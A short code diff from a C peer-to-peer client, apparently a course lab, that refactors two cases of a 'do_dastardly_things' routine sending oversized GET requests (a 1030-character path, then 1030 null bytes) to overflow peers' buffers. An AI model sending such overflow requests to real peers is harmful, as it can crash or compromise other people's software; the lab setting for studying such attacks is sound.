@@ -925,29 +925,25 @@ void do_dastardly_things(task_t *tracker_task)
 					// Write a huge filepath to overflow some buffers.
 					// String is over 1024 chars, so it won't land on a power of 2 boundary
 					// in case they increased their buffer size
-					size_t size = 1030;
-					char *attack_buffer = malloc(sizeof(char) * size+1);
-					memset(attack_buffer, 'x', size);
+					const size_t size = 1030;
+					char attack_buffer[size+1];
+					memset(attack_buffer, 'a', size);
 					attack_buffer[size] = '\0';
 
 					osp2p_writef(t->peer_fd, "GET %s OSP2P\n", attack_buffer);
-
-					free(attack_buffer);
 					break;
 				}
 				case 3:
 				default:
 				{
 					// Ditto but with nulls instead
-					size_t size = 1030;
-					char *attack_buffer = malloc(sizeof(char) * size+1);
+					const size_t size = 1030;
+					char attack_buffer[size+1];
 					memset(attack_buffer, '\0', size);
 
 					osp2p_writef(t->peer_fd, "GET ");
 					write(t->peer_fd, attack_buffer, size);
 					osp2p_writef(t->peer_fd, " OSP2P\n");
-
-					free(attack_buffer);
 					break;
 				}
 			}
